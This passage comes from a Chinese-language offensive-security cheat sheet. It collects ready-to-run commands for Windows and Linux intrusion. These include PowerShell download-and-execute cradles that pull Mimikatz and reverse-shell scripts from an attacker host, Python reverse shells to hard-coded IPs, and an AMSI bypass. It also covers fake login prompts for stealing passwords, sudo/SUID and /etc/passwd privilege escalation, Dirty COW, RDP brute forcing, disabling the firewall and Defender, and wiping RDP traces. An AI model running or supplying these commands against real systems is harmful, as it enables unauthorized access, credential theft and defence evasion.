href=\"#增删注册表\">#</a> 增删注册表</h3>\n<pre><code>保存为.inf文件\n&gt;rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf\n[Version]\nSignature=&quot;$WINDOWS NT$&quot;\n[DefaultInstall]\nAddReg=AddReg\nDelReg=DelReg\n[AddReg] #删除DelReg删掉红色部分执行\nHKLM,SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,SYSTEM,0x00000000,c:/windows/temp/sv.exe\n0x00010001表示REG_DWORD数据类型，0x00000000或省略该项(保留逗号)表示REG_SZ(字符串)\n</code></pre>\n<h2 id=\"-290\"><a class=\"anchor\" href=\"#-290\">#</a> </h2>\n<h3 id=\"写文件\"><a class=\"anchor\" href=\"#写文件\">#</a> 写文件</h3>\n<pre><code>&gt;rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\\\Temp\\\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close();\n</code></pre>\n<h2 id=\"-291\"><a class=\"anchor\" href=\"#-291\">#</a> </h2>\n<h3 id=\"out-rundllcommand\"><a class=\"anchor\" href=\"#out-rundllcommand\">#</a> Out-RundllCommand</h3>\n<pre><code>使用nishang脚本Out-RundllCommand生成rundll代码\n&gt;powershell -nop -w h -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Execution/Out-RundllCommand.ps1'); Out-RundllCommand -Reverse -IPAddress 192.168.0.107 -Port 12345&quot;\n</code></pre>\n<p><img data-src=\"135.png\" alt=\"\" /><br />\n<img data-src=\"136.png\" alt=\"\" /></p>\n<pre><code>注：低版本powershell，隐藏窗口只识别-w hidden，高版本可以-w h\n执行远程PS脚本\n&gt;Out-RundllCommand -PayloadURL http://192.168.0.107/Invoke-PowerShellUdp.ps1 -Arguments &quot;Invoke-PowerShellUdp -Reverse -IPAddress 192.168.0.107 -Port 12138&quot;\n上线MSF\n生成psh-reflection格式脚本\n&gt;rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();r=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;powershell -w hidden -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('http://192.168.0.107/xx.ps1'));&quot;,0,true);\n</code></pre>\n<h2 id=\"-292\"><a class=\"anchor\" href=\"#-292\">#</a> </h2>\n<h2 id=\"dotnettojscript\"><a class=\"anchor\" href=\"#dotnettojscript\">#</a> DotNetToJScript</h2>\n<pre><code>通过js/vbs执行.net程序\nhttps://github.com/tyranid/DotNetToJScript/releases\n&gt;DotNetToJScript.exe -o 1.js ExampleAssembly.dll 生成js\n&gt;DotNetToJScript.exe -l vbscript -o 2.vbs ExampleAssembly.dll生成vbs\n&gt;DotNetToJScript.exe -l vba -o 2.txt ExampleAssembly.dll 生成vba\n&gt;DotNetToJScript.exe -u -o 3.sct ExampleAssembly.dll生成sct\n</code></pre>\n<h2 id=\"-293\"><a class=\"anchor\" href=\"#-293\">#</a> </h2>\n<h3 id=\"starfighters\"><a class=\"anchor\" href=\"#starfighters\">#</a> StarFighters</h3>\n<pre><code>https://github.com/Cn33liz/StarFighters 可以执行powershell代码，详见\n执行单条命令\n$code = 'start calc.exe'\n$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);\n$encoded = [System.Convert]::ToBase64String($bytes)\n$encoded\n复制为var EncodedPayload的值\n远程执行mimikatz\npowershell IEX &quot;(New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'log privilege::debug sekurlsa::logonpasswords'&quot;\n以上保存在code.txt\n$code = Get-Content -Path code.txt\n$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);\n$encoded = [System.Convert]::ToBase64String($bytes)\n$encoded | Out-File 2.txt\n</code></pre>\n<p><img data-src=\"137.png\" alt=\"\" /></p>\n<pre><code>生成的2.txt文件内容替换为var EncodedPayload的值再执行\n</code></pre>\n<p><img data-src=\"138.png\" alt=\"\" /><br />\n<img data-src=\"139.png\" alt=\"\" /></p>\n<h2 id=\"-294\"><a class=\"anchor\" href=\"#-294\">#</a> </h2>\n<h3 id=\"绕过amsi执行\"><a class=\"anchor\" href=\"#绕过amsi执行\">#</a> 绕过 AMSI 执行</h3>\n<pre><code>&gt;copy c:\\windows\\system32\\cscript.exe amsi.dll\n&gt;amsi.dll evil.js\n</code></pre>\n<h2 id=\"-295\"><a class=\"anchor\" href=\"#-295\">#</a> </h2>\n<h2 id=\"wmic\"><a class=\"anchor\" href=\"#wmic\">#</a> WMIC</h2>\n<pre><code>Empire建立监听，生成windows/launcher_xsl模块的xsl文件保存在web目录\n&gt;wmic process get brief /format:http://192.168.0.107:8080/launcher.xsl\n也可结合mshta使用\n</code></pre>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version='1.0'?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>stylesheet</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/1999/XSL/Transform<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>ms</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>urn:schemas-microsoft-com:xslt<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>user</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>placeholder<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token attr-name\">version</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>output</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">ms:</span>script</span> <span class=\"token attr-name\">implements-prefix</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>user<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>JScript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token cdata\">&lt;![CDATA[</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tvar r = new ActiveXObject(\"WScript.Shell\").Run(\"mshta http://192.168.0.107:8080/RgNeCv.hta\");</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t]]></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span><span class=\"token namespace\">ms:</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>stylesheet</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"-296\"><a class=\"anchor\" href=\"#-296\">#</a> </h2>\n<h2 id=\"msxsl\"><a class=\"anchor\" href=\"#msxsl\">#</a> Msxsl</h2>\n<pre><code>下载\nhttps://www.microsoft.com/en-us/download/details.aspx?id=21714\n远程执行shellcode\nhttps://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml\n&gt;msxls.exe http://192.168.0.107/shellcode.xml http://192.168.0.107/shellcode.xml\nEmpire生成shellcode贴到脚本中EncodedPayload位置\n</code></pre>\n<p><img data-src=\"140.png\" alt=\"\" /></p>\n<h2 id=\"-297\"><a class=\"anchor\" href=\"#-297\">#</a> </h2>\n<h2 id=\"cpl\"><a class=\"anchor\" href=\"#cpl\">#</a> CPL</h2>\n<pre><code>Kali监听\n</code></pre>\n<p><img data-src=\"141.png\" alt=\"\" /></p>\n<pre><code>编译成DLL\n</code></pre>\n<p><img data-src=\"142.png\" alt=\"\" /></p>\n<pre><code>Control执行\n&gt;control C:\\Users\\Administrator.DC\\Desktop\\VC6.0green\\MyProjects\\dll\\Debug\\dll.dll\n</code></pre>\n<p><img data-src=\"143.png\" alt=\"\" /></p>\n<pre><code>或将DLL后缀改为cpl，双击执行，或rundll32执行\n&gt;rundll32.exe shell32.dll,Control_RunDLL C:\\Users\\Administrator.DC\\Desktop\\VC6.0green\\MyProjects\\dll\\Debug\\dll.dll\n</code></pre>\n<h3 id=\"runas\"><a class=\"anchor\" href=\"#runas\">#</a> Runas</h3>\n<pre><code>#use exploit/windows/local/ask\n</code></pre>\n<h3 id=\"令牌窃取\"><a class=\"anchor\" href=\"#令牌窃取\">#</a> 令牌窃取</h3>\n<h2 id=\"-298\"><a class=\"anchor\" href=\"#-298\">#</a> </h2>\n<h2 id=\"msf-3\"><a class=\"anchor\" href=\"#msf-3\">#</a> MSF</h2>\n<pre><code>Meterpreter&gt;use incognito\nMeterpreter&gt;list_tokens -u\nMeterpreter&gt;impersonate_token name\\\\administrator\n&amp;\nMeterpreter&gt;ps\nMeterpreter&gt;steal_token pid\n</code></pre>\n<h2 id=\"-299\"><a class=\"anchor\" href=\"#-299\">#</a> </h2>\n<h2 id=\"cobalt-strike\"><a class=\"anchor\" href=\"#cobalt-strike\">#</a> Cobalt strike</h2>\n<pre><code>beacon&gt; steal_token 1234 窃取令牌\nbeacon&gt; rev2self 恢复令牌\nWindows\nhttps://gitee.com/RichChigga/incognito2\n</code></pre>\n<h3 id=\"密码窃取\"><a class=\"anchor\" href=\"#密码窃取\">#</a> 密码窃取</h3>\n<h2 id=\"-300\"><a class=\"anchor\" href=\"#-300\">#</a> </h2>\n<h2 id=\"伪造锁屏\"><a class=\"anchor\" href=\"#伪造锁屏\">#</a> 伪造锁屏</h2>\n<pre><code>https://github.com/Pickfordmatt/SharpLocker/releases\n</code></pre>\n<p><img data-src=\"144.png\" alt=\"\" /></p>\n<pre><code>https://github.com/bitsadmin/fakelogonscreen/releases\n</code></pre>\n<p><img data-src=\"145.png\" alt=\"\" /></p>\n<pre><code>记录的密码保存在\n%LOCALAPPDATA%\\Microsoft\\user.db\n</code></pre>\n<p><img data-src=\"146.png\" alt=\"\" /></p>\n<h2 id=\"-301\"><a class=\"anchor\" href=\"#-301\">#</a> </h2>\n<h2 id=\"伪造认证框\"><a class=\"anchor\" href=\"#伪造认证框\">#</a> 伪造认证框</h2>\n<h2 id=\"-302\"><a class=\"anchor\" href=\"#-302\">#</a> </h2>\n<h3 id=\"credsleaker\"><a class=\"anchor\" href=\"#credsleaker\">#</a> CredsLeaker</h3>\n<pre><code>https://github.com/Dviros/CredsLeaker\n将cl_reader.php，config.php，config.cl上传到web服务器\n修改CredsLeaker.ps1、run.bat中URL参数\n</code></pre>\n<p><img data-src=\"147.png\" alt=\"\" /></p>\n<pre><code>输入正确密码后会自动结束，否则除非结束powershell进程才可结束\n获取到正确密码后会在目录下生成creds.txt保存密码信息\n</code></pre>\n<p><img data-src=\"148.png\" alt=\"\" /></p>\n<h2 id=\"-303\"><a class=\"anchor\" href=\"#-303\">#</a> </h2>\n<h3 id=\"loginprompt\"><a class=\"anchor\" href=\"#loginprompt\">#</a> LoginPrompt</h3>\n<pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/Invoke-LoginPrompt.ps1');invoke-LoginPrompt&quot;\n</code></pre>\n<p><img data-src=\"149.png\" alt=\"\" /></p>\n<pre><code>除非结束进程，否则只能输对密码才能关闭对话框。\n收到正确密码会返回结果\n</code></pre>\n<p><img data-src=\"150.png\" alt=\"\" /></p>\n<h2 id=\"-304\"><a class=\"anchor\" href=\"#-304\">#</a> </h2>\n<h3 id=\"nishang-invoke-credentialsphish\"><a class=\"anchor\" href=\"#nishang-invoke-credentialsphish\">#</a> Nishang-Invoke-CredentialsPhish</h3>\n<pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.108/ps/nishang/Gather/Invoke-CredentialsPhish.ps1'); Invoke-CredentialsPhish&quot;\n</code></pre>\n<p><img data-src=\"151.png\" alt=\"\" /><br />\n<img data-src=\"152.png\" alt=\"\" /></p>\n<h3 id=\"rottenpotato\"><a class=\"anchor\" href=\"#rottenpotato\">#</a> RottenPotato</h3>\n<pre><code>https://github.com/foxglovesec/RottenPotato Meterpreter&gt;use incognito\nMeterpreter&gt;list_tokens -u\nMeterpreter&gt;upload /root/Desktop/rottenpotato.exe\nMeterpreter&gt;execute -HC -f rottenpotato.exe\nMeterpreter&gt;impersonate_token &quot;NT AUTHORITY\\\\SYSTEM&quot;\n</code></pre>\n<h3 id=\"powerup\"><a class=\"anchor\" href=\"#powerup\">#</a> PowerUp</h3>\n<pre><code>检测有漏洞的服务\n&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1');Invoke-AllChecks&quot;\n</code></pre>\n<p><img data-src=\"153.png\" alt=\"\" /></p>\n<pre><code>&gt;icacls C:\\Windows\\system32\\\\wlbsctrl.dll 查看文件权限，F为完全控制，M修改\n</code></pre>\n<p><img data-src=\"154.png\" alt=\"\" /></p>\n<pre><code>在AbuseFunction中会显示利用语句。\n&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1'); Write-HijackDll -OutputFile 'C:\\Windows\\system32\\\\wlbsctrl.dll' -Command 'net user admin pass@Qwe1 /add&amp;net localgroup administrators admin /add'&quot;\n</code></pre>\n<p><img data-src=\"155.png\" alt=\"\" /></p>\n<pre><code>重启电脑后会新增用户admin\n</code></pre>\n<p><img data-src=\"156.png\" alt=\"\" /></p>\n<pre><code>查找可能劫持的进程\n&gt;Find-ProcessDLLHijack\n查找环境变量中当前用户可修改的目录\n&gt;Find-PathDLLHijack\n查找存在注册表中自动登录用户的平局\n&gt;Get-RegistryAutoLogon\n查询trusted_service_path\n&gt;Get-ServiceUnquoted\n查询当前用户可修改的注册表开机启动项\n&gt;Get-ModifiableRegistryAutoRun\n查询当前用户可修改的计划任务项\n&gt;Get-ModifiableScheduledTaskFile\n查询系统中所有web.config文件中的明文密码\n&gt;Get-WebConfig\n</code></pre>\n<h3 id=\"powerup-alwaysinstallelevated\"><a class=\"anchor\" href=\"#powerup-alwaysinstallelevated\">#</a> Powerup-AlwaysInstallElevated</h3>\n<pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1');Get-RegAlwaysInstallElevated&quot;\n</code></pre>\n<p><img data-src=\"157.png\" alt=\"\" /></p>\n<pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1'); Write-UserAddMSI&quot;\n普通用户执行安装\n</code></pre>\n<p><img data-src=\"158.png\" alt=\"\" /><br />\n<img data-src=\"159.png\" alt=\"\" /></p>\n<h3 id=\"alwaysinstallelevated提权\"><a class=\"anchor\" href=\"#alwaysinstallelevated提权\">#</a> AlwaysInstallElevated 提权</h3>\n<pre><code>&gt;reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n&gt;reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n为1 检测是否永远以高权限启动安装\n#HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n新建DWORD32 DisableMSI=0\n#msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi -o /root/add.msi\n#upload /root/add.msi c:\\\\1.msi\n&gt;msiexec /quiet /qn /i c:\\1.msi\nMSF\n#use exploit/windows/local/always_install_elevated\n#set session 1\n</code></pre>\n<h3 id=\"trusted-service-paths\"><a class=\"anchor\" href=\"#trusted-service-paths\">#</a> Trusted Service Paths</h3>\n<pre><code>&gt;wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\\windows\\\\&quot; |findstr /i /v &quot;&quot;&quot; 列出没有用引\t号包含的服务\n#use exploit/windows/local/trusted_service_path\n#set session 1\n</code></pre>\n<h3 id=\"vulnerable-services\"><a class=\"anchor\" href=\"#vulnerable-services\">#</a> Vulnerable Services</h3>\n<pre><code>#use exploit/windows/local/service_permissions\n#set session 1\n</code></pre>\n<h3 id=\"sudo提权\"><a class=\"anchor\" href=\"#sudo提权\">#</a> Sudo 提权</h3>\n<pre><code>/home/user/.sudo_as_admin_successful\n&gt;sudo zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;\n&gt;sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash\n&gt;sudo strace –o /dev/null /bin/bash\n&gt;sudo nmap –interactive nmap&gt;!sh\n&gt;echo &quot;os.execute('/bin.sh')&quot;&gt;/tmp/1.nse\n&gt;sudo nmap –script=/tmp/shell.nse \n&gt;sudo more/less/man /etc/rsyslog.conf\n&gt;sudo git help status \n&gt;!/bin/bash\n&gt;sudo ftp\n&gt;!/bin/bash\n&gt;sudo vim -c '!sh'\n&gt;sudo find /bin/ -name ls -exec /bin/bash ;\n&gt;sudo awk 'BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;'\n</code></pre>\n<h3 id=\"linux计划任务\"><a class=\"anchor\" href=\"#linux计划任务\">#</a> Linux 计划任务</h3>\n<pre><code>&gt;for user in $(getent passwd|cut -f1 -d:); do echo &quot;\n</code></pre>\n<h3 id=\"crontabs-for-user\"><a class=\"anchor\" href=\"#crontabs-for-user\">#</a> Crontabs for $user</h3>\n<h2 id=\"-305\"><a class=\"anchor\" href=\"#-305\">#</a> </h2>\n<p>##&quot;; crontab -u $user -l; done 列举所有用户的 crontab</p>\n<pre><code>$cat /etc/crontab\n$echo 'echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers' &gt;test.sh\n$echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;\n$echo &quot;&quot; &gt; --checkpoint=1\n或编辑可写的计划任务文件\n#!/usr/bin/python\nimport os,subprocess,socket\ns=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((&quot;192.168.0.107&quot;,&quot;5555&quot;))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])\n</code></pre>\n<h3 id=\"linux-suid提权\"><a class=\"anchor\" href=\"#linux-suid提权\">#</a> Linux SUID 提权</h3>\n<pre><code>查找有root权限的SUID文件\n$find / -perm -u=s -type f 2&gt;/dev/null\n$find / -user root -perm -4000 -print 2&gt;/dev/null\n$find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;\n</code></pre>\n<h2 id=\"-306\"><a class=\"anchor\" href=\"#-306\">#</a> </h2>\n<h2 id=\"find\"><a class=\"anchor\" href=\"#find\">#</a> Find</h2>\n<pre><code>$touch xxx\n$/usr/bin/find xxx –exec whoami \\;\n$/usr/bin/find xxx –exec python -c 'import \tsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.2&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'  \\;\n&amp;\n&gt;find xxx -exec netcat -lvp 12138 -e /bin/sh \\; 然后攻击机主动连接\n</code></pre>\n<h2 id=\"-307\"><a class=\"anchor\" href=\"#-307\">#</a> </h2>\n<h2 id=\"nmap\"><a class=\"anchor\" href=\"#nmap\">#</a> NMAP</h2>\n<pre><code># 进入nmap的交互模式\n&gt;nmap --interactive \n&gt;!sh\n</code></pre>\n<h2 id=\"-308\"><a class=\"anchor\" href=\"#-308\">#</a> </h2>\n<h2 id=\"vim\"><a class=\"anchor\" href=\"#vim\">#</a> VIM</h2>\n<pre><code>&gt;vim.tiny /etc/shadow\n&amp;\n&gt;vim.tiny\n# 按ESC\n:set shell=/bin/sh\n:shell\n</code></pre>\n<h2 id=\"-309\"><a class=\"anchor\" href=\"#-309\">#</a> </h2>\n<h2 id=\"bash\"><a class=\"anchor\" href=\"#bash\">#</a> BASH</h2>\n<pre><code>&gt;bash –p\n</code></pre>\n<h2 id=\"-310\"><a class=\"anchor\" href=\"#-310\">#</a> </h2>\n<p>##More/Less/Man</p>\n<pre><code>&gt;less /etc/passwd\n!/bin/sh\n&gt;more /etc/passwd\n!/bin/bash\n&gt;man passwd\n!/bin/bash\n</code></pre>\n<h2 id=\"-311\"><a class=\"anchor\" href=\"#-311\">#</a> </h2>\n<h2 id=\"cpmv\"><a class=\"anchor\" href=\"#cpmv\">#</a> CP/MV</h2>\n<pre><code>覆盖shadow文件\n</code></pre>\n<h3 id=\"linux-etcpasswd提权\"><a class=\"anchor\" href=\"#linux-etcpasswd提权\">#</a> Linux /etc/passwd 提权</h3>\n<pre><code>$ls –lh /etc/passwd 若是任何用户可读写\n$perl -le 'print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)' 生成密码\n$echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd\n一条命令添加root用户\n#useradd -p `openssl passwd -1 -salt 'user' 123qwe` -u 0 -o -g root  -G root -s /bin/bash -d /home/user venus\n用户名venus 密码123qwe\n#useradd newuser;echo &quot;newuser:password&quot;|chpasswd\n&gt;echo &quot;admin:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd\n&gt;passwd admin修改密码\n</code></pre>\n<h3 id=\"linux脏牛提权\"><a class=\"anchor\" href=\"#linux脏牛提权\">#</a> Linux 脏牛提权</h3>\n<pre><code>https://github.com/FireFart/dirtycow\n$gcc -pthread dirty.c -o dirty –lcrypt\n$./dirty passwd \n生成账户密码\nhttps://github.com/gbonacini/CVE-2016-5195\n$make\n$./dcow -s\n</code></pre>\n<h2 id=\"rdpfireawall\"><a class=\"anchor\" href=\"#rdpfireawall\">#</a> RDP&amp;Fireawall</h2>\n<h3 id=\"爆破\"><a class=\"anchor\" href=\"#爆破\">#</a> 爆破</h3>\n<pre><code>Hydra爆破RDP\n&gt;hydra -l admin -P /root/Desktop/passwords -S 192.168.0.0 rdp\n&amp;\nNlbrute\n</code></pre>\n<p><img data-src=\"160.png\" alt=\"\" /></p>\n<h3 id=\"注册表开启\"><a class=\"anchor\" href=\"#注册表开启\">#</a> 注册表开启</h3>\n<pre><code>查询系统是否允许3389远程连接：\n&gt;REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections\n1表示关闭，0表示开启\n查看远程连接的端口：\n&gt;REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber\n本机开启3389远程连接的方法\n通过cmd\n&gt;REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f\n通过reg文件\n内容如下：\nWindows Registry Editor Version 5.00\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]\n&quot;fDenyTSConnections&quot;=dword:00000000\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp]\n&quot;PortNumber&quot;=dword:00000d3d\n导入注册表：\nregedit /s a.reg\n</code></pre>\n<h3 id=\"netsh启动服务\"><a class=\"anchor\" href=\"#netsh启动服务\">#</a> NETSH 启动服务</h3>\n<pre><code>&gt;netsh firewall set service remoteadmin enable \n&gt;netsh firewall set service remotedesktop enable\n&gt;netsh firewall set opmode disable 关闭防火墙\n</code></pre>\n<h3 id=\"注入点开启\"><a class=\"anchor\" href=\"#注入点开启\">#</a> 注入点开启</h3>\n<pre><code>.asp?id=100;exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG_DWORD',0;--\n注：\n修改连接端口重启后生效\n</code></pre>\n<h3 id=\"msf开启\"><a class=\"anchor\" href=\"#msf开启\">#</a> MSF 开启</h3>\n<pre><code>#run post/windows/manage/enable_rdp\n</code></pre>\n<h3 id=\"wmic开启\"><a class=\"anchor\" href=\"#wmic开启\">#</a> Wmic 开启</h3>\n<pre><code>&gt;wmic /node:192.168.1.2 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1\n</code></pre>\n<h3 id=\"防火墙\"><a class=\"anchor\" href=\"#防火墙\">#</a> 防火墙</h3>\n<pre><code>允许进站\n如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:\n&gt;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow\n&gt;netsh firewall set portopening TCP 3389 ENABLE\n防火墙关闭\n&gt;netsh firewall set opmode mode=disable\n&gt;netsh advfirewall show allprofiles查看状态\n&gt;netsh advfirewall set allprofiles state off \n&gt;sc stop windefend\n&gt;sc delete windefend\nPS&gt; Set-MpPreference -DisableRealtimeMonitoring 1\nPS&gt; Set-MpPreference -Disablearchivescanning $true\n</code></pre>\n<h3 id=\"多用户登录\"><a class=\"anchor\" href=\"#多用户登录\">#</a> 多用户登录</h3>\n<pre><code>Mimikatz设置允许多用户登录\n&gt;privilege::debug\n&gt;ts::multirdp\nrdpwrap\nhttps://github.com/stascorp/rdpwrap\n&gt;RDPWInst.exe -i is\n</code></pre>\n<h3 id=\"rdp连接记录\"><a class=\"anchor\" href=\"#rdp连接记录\">#</a> RDP 连接记录</h3>\n<pre><code>https://github.com/3gstudent/List-RDP-Connections-History\n查看本机用户连接RDP的记录\n</code></pre>\n<p><img data-src=\"161.png\" alt=\"\" /></p>\n<pre><code>&gt;Psloggedon.exe username\n</code></pre>\n<p><img data-src=\"162.png\" alt=\"\" /></p>\n<h3 id=\"删除痕迹\"><a class=\"anchor\" href=\"#删除痕迹\">#</a> 删除痕迹</h3>\n<pre><code>@echo off\n@reg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot; /va /f\n@del &quot;%USERPROFILE%\\My Documents\\Default.rdp&quot; /a\n@exit\n</code></pre>\n<h2 id=\"端口映射转发\"><a class=\"anchor\" href=\"#端口映射转发\">#</a> 端口映射 &amp; 转发</h2>\n<h3 id=\"msf-4\"><a class=\"anchor\" href=\"#msf-4\">#</a> MSF</h3>\n<pre><code>使用条件：服务器通外网，拥有自己的公网ip\n&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153\n转发目标主机的3389远程桌面服务端口到本地的5555\n&gt;portfwd list\n</code></pre>\n<h3 id=\"lcxexe\"><a class=\"anchor\" href=\"#lcxexe\">#</a> lcx.exe</h3>\n<pre><code>使用条件：服务器通外网，拥有自己的公网ip\n靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389\nlinux攻击机：./portmap -m 2 -p1 9999 -p2 33889\nwindows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889\nPortTran\nhttps://github.com/k8gege/K8tools/raw/master/PortTran.rar\n攻击机执行\n&gt;PortTranS20.exe 12345 389\n</code></pre>\n<p><img data-src=\"163.png\" alt=\"\" /></p>\n<pre><code>靶机执行\n&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345\n建立连接后，攻击机连接本机389端口即可\n</code></pre>\n<p><img data-src=\"164.png\" alt=\"\" /></p>\n<h3 id=\"ssh-2\"><a class=\"anchor\" href=\"#ssh-2\">#</a> SSH</h3>\n<pre><code>-C 压缩传输，加快传输速度\n-f 在后台对用户名密码进行认证\n-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行\n-q 安静模式，不要显示任何debug信息\n-l 指定ssh登录名\n-g 允许远程主机连接到本地用于转发的端口\n-L 进行本地端口转发\n-R 进行远程端口转发\n-D 动态转发，即socks代理\n-T 禁止分配伪终端\n-p 指定远程ssh服务端口\n</code></pre>\n<h2 id=\"-312\"><a class=\"anchor\" 